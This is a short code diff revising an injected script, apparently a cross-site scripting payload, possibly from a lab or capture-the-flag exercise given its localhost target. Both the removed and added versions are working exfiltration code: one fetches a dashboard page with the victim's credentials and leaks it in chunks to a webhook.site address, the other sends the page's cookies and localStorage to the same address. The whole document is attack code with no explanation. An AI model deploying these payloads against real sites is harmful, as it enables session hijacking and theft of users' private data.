@@ -1,19 +1,11 @@
 <script>
-(async ()=>{
-  try{
-    const r = await fetch('https://localhost:8000/dashboard', { credentials: 'include' });
-    const text = await r.text();
-    const max = 1800; // safe chunk size
-    for (let i = 0; i < text.length; i += max) {
-      const chunk = text.slice(i, i + max);
-      // Include index and total-ish indicator so you can reassemble
-      new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?p=/api/notes&i='
-        + (i / max) + '&d=' + encodeURIComponent(chunk);
-      // small delay can help in flaky headless envs, but optional
-      await new Promise(r=>setTimeout(r, 50));
-    }
-  } catch (e) {
-    new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?err=' + encodeURIComponent(String(e));
-  }
-})();
+try {
+  // send cookie and localStorage to webhook via image GET
+  new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?c='
+    + encodeURIComponent(document.cookie)
+    + '&ls=' + encodeURIComponent(JSON.stringify(localStorage));
+} catch (e) {
+  new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?err='
+    + encodeURIComponent(String(e));
+}
 </script>
